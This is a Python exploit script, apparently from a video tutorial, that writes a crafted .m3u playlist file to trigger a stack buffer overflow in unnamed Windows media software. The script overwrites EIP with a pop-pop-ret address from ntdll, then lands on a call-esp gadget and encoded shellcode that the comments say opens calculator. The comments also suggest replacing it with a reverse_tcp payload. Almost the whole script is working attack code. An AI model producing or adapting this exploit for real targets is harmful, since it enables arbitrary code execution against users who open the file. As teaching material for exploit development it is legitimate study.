import struct

#in this method we have shellcode somewhere on our stack
#and no register points to our shellcode address
#in these types of cases we use pop pop ... ret method 
#we will pop all the contents above the shellcode on our stack and then 
#we call ret our shellcode and it executes
#i am gonna choose ntdll
#7C970D32   58               POP EAX
#7C970D33   5D               POP EBP
#we got our jmp esp previously
#			0x7C8369F0      call esp
#			0x7C86467B      jmp esp
#			0x7C868667      call esp

junk='A'*26064

eip=struct.pack('<I',0x7C970D32)

beforeesp='B'*4

preshellcode='\xcc'
preshellcode+='\x90'*7


esp=struct.pack('<I',0x7C8369F0)

shellcode=""
#you can test with a break point first 
#shellcode+="\xcc"
shellcode+='\x90'*25

#this is shellcode which pops calculator
#you can replace with yours like reverse_tcp or anyone

shellcode+=("\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"+\
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"+\
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"+\
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"+\
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"+\
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"+\
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"+\
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"+\
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"+\
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"+\
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"+\
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"+\
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"+\
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"+\
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"+\
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"+\
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"+\
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"+\
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"+\
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"+\
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"+\
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41")




shellcode+='\x90'*25

#finally i am converting into bytes
#becoz in pyhton3.7 i cant pack eip into string using struct
#so i converted into bytes
#both work in same manner

junk=junk.encode('raw_unicode_escape')
beforeesp=beforeesp.encode('raw_unicode_escape')
preshellcode=preshellcode.encode('raw_unicode_escape')
shellcode=shellcode.encode('raw_unicode_escape')

#appending all parts
overflow=junk+eip+beforeesp+preshellcode+esp+shellcode
#writing into file

f=open("C:\\Users\\nikki\\Desktop\\exploit_development_python\\poppopret.m3u","wb")

f.write(overflow)

f.close()

print("file created successfully")






#THANKS FOR WATCHING 
#SUBSCRIBE FOR MORE TUTORIALS
